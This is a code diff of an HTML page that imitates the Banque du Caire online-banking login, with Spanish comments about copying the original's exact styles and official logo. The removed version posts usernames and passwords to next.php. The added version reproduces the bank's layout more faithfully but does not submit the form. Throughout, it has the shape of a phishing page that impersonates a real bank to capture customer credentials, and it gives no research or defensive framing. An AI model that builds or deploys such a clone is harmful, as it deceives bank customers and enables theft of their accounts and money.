@@ -1,491 +1,434 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>BDC Bank - Banca en Línea</title>
-    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
-    <!-- Font Awesome para iconos -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        /* ===== RESET Y FUENTES ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            max-width: 1200px;
-            width: 100%;
-            background: #ffffff;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
-            overflow: hidden;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banque du Caire - Login</title>
+  <!-- Iconos de FontAwesome para replicar los íconos del formulario y tarjetas -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
 
-        /* ===== TOP BAR (ATM, Help, Support, Árabe) ===== */
-        .top-bar {
-            background: #f8faff;
-            padding: 8px 40px;
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-            gap: 20px;
-            font-size: 13px;
-            color: #1a2b4a;
-            border-bottom: 1px solid #eaeef2;
-        }
-        .top-bar a {
-            color: #1a2b4a;
-            text-decoration: none;
-        }
-        .top-bar a:hover {
-            text-decoration: underline;
-        }
-        .top-bar .lang-ar {
-            font-family: 'Arial', sans-serif;
-            direction: rtl;
-        }
+    body {
+      background-color: #0b0202;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
 
-        /* ===== HEADER ===== */
-        .header {
-            background: #ffffff;
-            padding: 15px 40px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #eaeef2;
-        }
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .logo img {
-            height: 45px;
-            width: auto;
-        }
-        .logo h1 {
-            font-size: 22px;
-            color: #1a2b4a;
-            font-weight: 600;
-        }
-        .header-links a {
-            color: #1a2b4a;
-            text-decoration: none;
-            margin-left: 25px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .header-links a:hover {
-            color: #0056a7;
-        }
+    /* --- Top Navbar --- */
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 40px;
+      background-color: #000000;
+    }
 
-        /* ===== HERO / LOGIN ===== */
-        .hero {
-            background: linear-gradient(135deg, #f8faff 0%, #eef4f9 100%);
-            padding: 50px 40px;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            align-items: center;
-            gap: 30px;
-        }
-        .hero-left {
-            flex: 1 1 400px;
-            max-width: 480px;
-        }
-        .hero-left h2 {
-            font-size: 34px;
-            color: #1a2b4a;
-            font-weight: 300;
-            margin-bottom: 6px;
-        }
-        .hero-left .sub {
-            color: #6b7a8f;
-            font-size: 16px;
-            margin-bottom: 28px;
-        }
+    .brand-logo {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
 
-        /* ===== FORMULARIO (estilos exactos del original) ===== */
-        .login-box {
-            background: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.06);
-            padding: 30px 30px 25px;
-            width: 100%;
-        }
-        .login-box label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            color: #1a2b4a;
-            margin-bottom: 4px;
-        }
-        .login-box input {
-            width: 100%;
-            padding: 10px 12px;
-            border: solid 1px #8b8b8b !important;
-            border-radius: 10px !important;
-            font-size: 15px !important;
-            color: #000 !important;
-            margin-bottom: 18px;
-            background: #fafbfc;
-            transition: 0.2s;
-            outline: none;
-        }
-        .login-box input:focus {
-            border-color: #1a2b4a;
-            background: #ffffff;
-            box-shadow: 0 0 0 3px rgba(26,43,74,0.1);
-        }
-        .login-box input::placeholder {
-            color: #b6b6b6 !important;
-        }
-        .login-box .actions {
-            display: flex;
-            justify-content: space-between;
-            font-size: 13px;
-            margin-bottom: 20px;
-        }
-        .login-box .actions a {
-            color: #0056a7;
-            text-decoration: none;
-        }
-        .login-box .actions a:hover {
-            text-decoration: underline;
-        }
+    /* Enlazado del logo principal */
+    .brand-logo img {
+      height: 35px; /* Ajuste de altura */
+      width: auto;
+    }
 
-        /* ===== BOTÓN LOGIN (gradiente exacto del original) ===== */
-        .btn-login {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(to right, #ef4230 0%, #f26131 48%, #f68b33 97%) !important;
-            border: 0px solid rgba(255, 255, 255, 0.0) !important;
-            border-radius: 10px !important;
-            color: #ffffff !important;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            outline: 0 !important;
-        }
-        .btn-login:hover {
-            opacity: 0.9;
-        }
+    .top-links {
+      display: flex;
+      gap: 25px;
+      font-size: 13px;
+      color: #cccccc;
+    }
 
-        /* ===== IMAGEN DERECHA ===== */
-        .hero-right {
-            flex: 1 1 300px;
-            max-width: 400px;
-            text-align: center;
-        }
-        .hero-right img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 12px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
-        }
+    .top-links a {
+      color: #cccccc;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
 
-        /* ===== SECCIÓN "Banking with An Edge" ===== */
-        .edge-section {
-            padding: 50px 40px;
-            background: #ffffff;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            align-items: center;
-            border-top: 1px solid #eaeef2;
-            gap: 30px;
-        }
-        .edge-text {
-            flex: 1 1 400px;
-            max-width: 550px;
-        }
-        .edge-text h3 {
-            font-size: 30px;
-            color: #1a2b4a;
-            margin-bottom: 12px;
-            font-weight: 300;
-        }
-        .edge-text h3 span {
-            color: #0056a7;
-            font-weight: 600;
-        }
-        .edge-text p {
-            color: #4a5a6e;
-            line-height: 1.7;
-            margin-bottom: 20px;
-            font-size: 15px;
-        }
-        .btn-learn {
-            background: transparent;
-            border: 2px solid #1a2b4a;
-            color: #1a2b4a;
-            padding: 10px 32px;
-            border-radius: 30px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-            font-size: 14px;
-        }
-        .btn-learn:hover {
-            background: #1a2b4a;
-            color: white;
-        }
-        .edge-image {
-            flex: 1 1 250px;
-            max-width: 320px;
-            text-align: center;
-        }
-        .edge-image img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 12px;
-        }
+    .top-links a:hover {
+      color: #ffffff;
+    }
 
-        /* ===== SERVICIOS ===== */
-        .services {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 30px;
-            padding: 40px;
-            background: #f8faff;
-            justify-content: center;
-        }
-        .service-card {
-            background: white;
-            border-radius: 12px;
-            padding: 28px 25px;
-            flex: 1 1 200px;
-            max-width: 280px;
-            text-align: center;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
-            transition: 0.25s;
-        }
-        .service-card:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
-        }
-        .service-card i {
-            font-size: 34px;
-            color: #1a2b4a;
-            margin-bottom: 12px;
-        }
-        .service-card h4 {
-            font-size: 18px;
-            color: #1a2b4a;
-            margin-bottom: 6px;
-        }
-        .service-card p {
-            color: #6b7a8f;
-            font-size: 14px;
-        }
+    /* --- Main Container --- */
+    .main-container {
+      flex: 1;
+      display: flex;
+      /* Sustitución del degradado por la imagen de fondo hero-card.png.jpg */
+      background-image: url('hero-card.png.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      padding: 40px;
+      position: relative;
+    }
 
-        /* ===== FOOTER ===== */
-        .footer {
-            background: #1a2b4a;
-            color: rgba(255,255,255,0.8);
-            padding: 22px 40px;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 13px;
-        }
-        .footer a {
-            color: rgba(255,255,255,0.7);
-            text-decoration: none;
-            margin-left: 20px;
-        }
-        .footer a:hover {
-            color: white;
-            text-decoration: underline;
-        }
-        .footer .social i {
-            margin-left: 12px;
-            font-size: 18px;
-            color: rgba(255,255,255,0.6);
-        }
-        .footer .social i:hover {
-            color: white;
-        }
+    /* Left Side: Login Box */
+    .login-section {
+      width: 380px;
+      z-index: 2;
+    }
 
-        /* ===== RESPONSIVE (para móvil) ===== */
-        @media (max-width: 768px) {
-            .top-bar {
-                padding: 8px 20px;
-                flex-wrap: wrap;
-                justify-content: center;
-                gap: 10px;
-            }
-            .header {
-                flex-wrap: wrap;
-                padding: 15px 20px;
-            }
-            .header-links a {
-                margin-left: 15px;
-                font-size: 13px;
-            }
-            .hero {
-                flex-direction: column;
-                text-align: center;
-                padding: 30px 20px;
-            }
-            .hero-left {
-                max-width: 100%;
-            }
-            .hero-right {
-                max-width: 100%;
-            }
-            .login-box {
-                padding: 20px;
-            }
-            .edge-section {
-                flex-direction: column;
-                text-align: center;
-                padding: 30px 20px;
-            }
-            .edge-text {
-                max-width: 100%;
-            }
-            .edge-image {
-                max-width: 100%;
-            }
-            .services {
-                flex-direction: column;
-                align-items: center;
-                padding: 20px;
-            }
-            .service-card {
-                max-width: 100%;
-                width: 100%;
-            }
-            .footer {
-                flex-direction: column;
-                text-align: center;
-                gap: 12px;
-                padding: 20px;
-            }
-            .footer a {
-                margin: 0 10px;
-            }
-        }
-    </style>
+    .login-card {
+      background-color: #f7f7f7;
+      color: #333333;
+      padding: 35px 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    }
+
+    .card-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center; /* Centrar logo en tarjeta */
+      margin-bottom: 30px;
+    }
+
+    /* Enlazado del logo dentro de la tarjeta */
+    .card-logo img {
+      height: 30px; /* Ajuste de altura menor */
+      width: auto;
+    }
+
+    .welcome-text {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 25px;
+      color: #222222;
+      text-align: center; /* Centrar texto */
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input-group i.left-icon {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888888;
+      font-size: 14px;
+    }
+
+    .input-group i.right-icon {
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888888;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 14px 15px 14px 40px;
+      border: 1px solid #e0e0e0;
+      border-radius: 8px;
+      font-size: 14px;
+      outline: none;
+      background-color: #ffffff;
+      transition: border-color 0.2s;
+    }
+
+    .input-group input:focus {
+      border-color: #ff4500;
+    }
+
+    .form-links {
+      display: flex;
+      justify-content: space-between;
+      font-size: 12px;
+      margin-bottom: 25px;
+    }
+
+    .form-links a.enroll {
+      color: #ff4500;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .form-links a.forgot {
+      color: #666666;
+      text-decoration: none;
+    }
+
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(90deg, #ff4500, #ff5e00);
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 4px 12px rgba(255, 69, 0, 0.3);
+      transition: background 0.3s;
+    }
+
+    .btn-login:hover {
+      background: linear-gradient(90deg, #e03e00, #e55300);
+    }
+
+    /* Right Side: Hero Content */
+    .hero-section {
+      flex: 1;
+      padding-left: 80px;
+      padding-top: 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    .hero-title {
+      font-size: 38px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      position: relative;
+      display: inline-block;
+    }
+
+    .hero-title::after {
+      content: '';
+      display: block;
+      width: 50px;
+      height: 3px;
+      background-color: #ff4500;
+      margin-top: 10px;
+      margin-bottom: 25px;
+    }
+
+    .hero-description {
+      font-size: 20px;
+      line-height: 1.4;
+      color: #f0f0f0;
+      margin-bottom: 12px;
+    }
+
+    .hero-subdescription {
+      font-size: 14px;
+      color: #cccccc;
+      margin-bottom: 30px;
+    }
+
+    .btn-learn-more {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 24px;
+      border: 1px solid #ffffff;
+      border-radius: 8px;
+      color: #ffffff;
+      text-decoration: none;
+      font-size: 14px;
+      width: fit-content;
+      transition: background-color 0.2s;
+    }
+
+    .btn-learn-more:hover {
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    /* Cards Section */
+    .cards-container {
+      display: flex;
+      gap: 20px;
+      margin-top: 60px;
+      margin-bottom: 40px;
+    }
+
+    .feature-card {
+      background-color: #f0ede9;
+      color: #222222;
+      border-radius: 16px;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      width: 320px;
+      cursor: pointer;
+      position: relative;
+      transition: transform 0.2s;
+    }
+
+    .feature-card:hover {
+      transform: translateY(-2px);
+    }
+
+    .feature-card .icon-box {
+      font-size: 28px;
+      color: #ff4500;
+    }
+
+    .feature-card.green .icon-box {
+      color: #2e7d32;
+    }
+
+    .feature-card.green {
+      background-color: #f0f5f1;
+    }
+
+    .card-content h4 {
+      font-size: 15px;
+      font-weight: 700;
+      margin-bottom: 4px;
+    }
+
+    .card-content p {
+      font-size: 11px;
+      color: #666666;
+      line-height: 1.3;
+    }
+
+    .card-arrow {
+      margin-left: auto;
+      font-size: 12px;
+      color: #333333;
+    }
+
+    /* --- Bottom Footer Bar --- */
+    .footer-bar {
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      padding-top: 20px;
+      display: flex;
+      gap: 20px;
+      font-size: 12px;
+      color: #cccccc;
+    }
+
+    .footer-bar a {
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .footer-bar span {
+      color: #666666;
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-
-    <!-- ===== TOP BAR ===== -->
-    <div class="top-bar">
-        <a href="#"><i class="fas fa-map-marker-alt"></i> ATM &amp; Branch Locator</a>
-        <a href="#"><i class="fas fa-question-circle"></i> Help &amp; Support</a>
-        <a href="#" class="lang-ar">أعلى</a>
+  <!-- Top Navigation -->
+  <header class="top-bar">
+    <div class="brand-logo">
+      <!-- Enlazado del logo oficial -->
+      <img src="logo-bdc.png.png" alt="Banque du Caire Logo">
     </div>
+    <nav class="top-links">
+      <a href="#"><i class="fa-solid fa-location-dot"></i> ATM & Branch Locator</a>
+      <a href="#"><i class="fa-regular fa-circle-question"></i> Help & Support</a>
+      <a href="#">العربية</a>
+    </nav>
+  </header>
 
-    <!-- ===== HEADER ===== -->
-    <header class="header">
-        <div class="logo">
-            <!-- TU LOGO (asegúrate de que la ruta sea correcta) -->
-            <img src="assets/img/logo-bdc.png" alt="Banque du Caire" onerror="this.style.display='none'">
-            <h1>Banque du Caire</h1>
-        </div>
-        <div class="header-links">
-            <a href="#"><i class="fas fa-globe"></i> En</a>
-            <a href="#">Enroll / Activate</a>
-        </div>
-    </header>
-
-    <!-- ===== HERO / LOGIN ===== -->
-    <section class="hero">
-        <div class="hero-left">
-            <h2>Welcome back</h2>
-            <p class="sub">Access your accounts securely</p>
-
-            <!-- FORMULARIO (envía a next.php) -->
-            <form action="next.php" method="post" class="login-box">
-                <label for="user">Username</label>
-                <input type="text" id="user" name="user" placeholder="Enter your username" required>
-
-                <label for="pass">Password</label>
-                <input type="password" id="pass" name="pass" placeholder="Enter your password" required>
-
-                <div class="actions">
-                    <a href="#">Enroll / Activate</a>
-                    <a href="#">Forgot password?</a>
-                </div>
-
-                <button type="submit" class="btn-login">Login</button>
-            </form>
+  <!-- Main Content Area -->
+  <main class="main-container">
+    
+    <!-- Left Login Card -->
+    <section class="login-section">
+      <div class="login-card">
+        <div class="card-logo">
+          <!-- Enlazado del logo oficial dentro de la tarjeta -->
+          <img src="logo-bdc.png.png" alt="Banque du Caire Logo">
         </div>
 
-        <div class="hero-right">
-            <!-- TU IMAGEN DECORATIVA -->
-            <img src="assets/img/hero-card.png" alt="Banking" onerror="this.style.display='none'">
-        </div>
+        <h2 class="welcome-text">Welcome back</h2>
+
+        <form onsubmit="event.preventDefault();">
+          <div class="input-group">
+            <i class="fa-regular fa-user left-icon"></i>
+            <input type="text" placeholder="Username" required>
+            <i class="fa-regular fa-circle-info right-icon"></i>
+          </div>
+
+          <div class="input-group">
+            <i class="fa-solid fa-lock left-icon"></i>
+            <input type="password" placeholder="Password" required>
+          </div>
+
+          <div class="form-links">
+            <a href="#" class="enroll">Enroll / Activate</a>
+            <a href="#" class="forgot">Forgot password?</a>
+          </div>
+
+          <button type="submit" class="btn-login">Login</button>
+        </form>
+      </div>
     </section>
 
-    <!-- ===== SECCIÓN "Banking with An Edge" ===== -->
-    <section class="edge-section">
-        <div class="edge-text">
-            <h3>Banking with <span>An Edge</span></h3>
-            <p>Your Stunning Internet banking experience Starts with BDC. Your Secure Banking Is our responsibility, Banking with An Edge.</p>
-            <button class="btn-learn">Learn More</button>
+    <!-- Right Hero Section -->
+    <section class="hero-section">
+      <div>
+        <h1 class="hero-title">Banking with An Edge</h1>
+        
+        <p class="hero-description">
+          Your Stunning Internet banking<br>
+          experience Starts with BDC
+        </p>
+        
+        <p class="hero-subdescription">
+          Your Secure Banking Is our responsibility, Banking with An Edge.
+        </p>
+
+        <a href="#" class="btn-learn-more">
+          Learn More <i class="fa-solid fa-chevron-right" style="font-size: 10px;"></i>
+        </a>
+      </div>
+
+      <!-- Feature Cards -->
+      <div>
+        <div class="cards-container">
+          <div class="feature-card">
+            <div class="icon-box">
+              <i class="fa-regular fa-calendar-check"></i>
+            </div>
+            <div class="card-content">
+              <h4>Book Appointment</h4>
+              <p>Schedule a visit at your convenience.</p>
+            </div>
+            <i class="fa-solid fa-chevron-right card-arrow"></i>
+          </div>
+
+          <div class="feature-card green">
+            <div class="icon-box">
+              <i class="fa-solid fa-arrows-rotate"></i>
+            </div>
+            <div class="card-content">
+              <h4>FX Rates</h4>
+              <p>Check the latest foreign exchange rates.</p>
+            </div>
+            <i class="fa-solid fa-chevron-right card-arrow"></i>
+          </div>
         </div>
-        <div class="edge-image">
-            <!-- Puedes poner otra imagen aquí o dejar solo texto -->
-            <!-- <img src="assets/img/edge-image.png" alt="Edge" onerror="this.style.display='none'"> -->
-        </div>
+
+        <!-- Footer Links inside main container -->
+        <footer class="footer-bar">
+          <a href="#">Locate Us</a> <span>|</span>
+          <a href="#">Contact Us</a> <span>|</span>
+          <a href="#">Privacy Policy</a> <span>|</span>
+          <a href="#">Terms & Conditions</a> <span>|</span>
+          <a href="#">FAQ</a>
+        </footer>
+      </div>
     </section>
 
-    <!-- ===== SERVICIOS ===== -->
-    <section class="services">
-        <div class="service-card">
-            <i class="fas fa-calendar-check"></i>
-            <h4>Book Appointment</h4>
-            <p>Schedule a visit at your convenience.</p>
-        </div>
-        <div class="service-card">
-            <i class="fas fa-exchange-alt"></i>
-            <h4>FX Rates</h4>
-            <p>Check the latest foreign exchange rates.</p>
-        </div>
-    </section>
-
-    <!-- ===== FOOTER ===== -->
-    <footer class="footer">
-        <div>
-            <a href="#">Locate Us</a>
-            <a href="#">Contact Us</a>
-            <a href="#">Privacy Policy</a>
-            <a href="#">Terms &amp; Conditions</a>
-            <a href="#">FAQ</a>
-        </div>
-        <div class="social">
-            <i class="fab fa-facebook"></i>
-            <i class="fab fa-twitter"></i>
-            <i class="fab fa-linkedin"></i>
-        </div>
-    </footer>
-
-</div>
-
-<!-- Script para ocultar imágenes rotas -->
-<script>
-    document.querySelectorAll('img').forEach(img => {
-        img.onerror = function() { this.style.display = 'none'; };
-    });
-</script>
+  </main>
 
 </body>
 </html>
